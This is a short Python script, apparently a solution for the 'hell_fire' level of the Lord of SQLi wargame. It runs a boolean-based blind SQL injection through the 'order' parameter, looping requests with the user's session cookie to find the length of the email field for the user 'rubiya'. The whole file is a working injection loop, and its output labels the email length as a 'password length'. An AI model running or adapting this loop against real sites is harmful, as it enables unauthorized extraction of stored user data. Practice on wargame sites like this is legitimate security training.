import urllib3
import requests

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?"
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

length = 0

for i in range(0,100):
    #query = "order=if(id='rubiya' and length(email)>{},id,9999)".format(i)
    query = "order=length(email)={},id=%27rubiya%27".format(i)
    req = requests.get(url+query, headers=header)
    print(url+query)
    print("[+] send req length is {}".format(i))
    
    if "</th><th>score</th><tr><td>admin" not in req.text:
        print(req.text)
        length = i
        break

print("password length is : ",length)
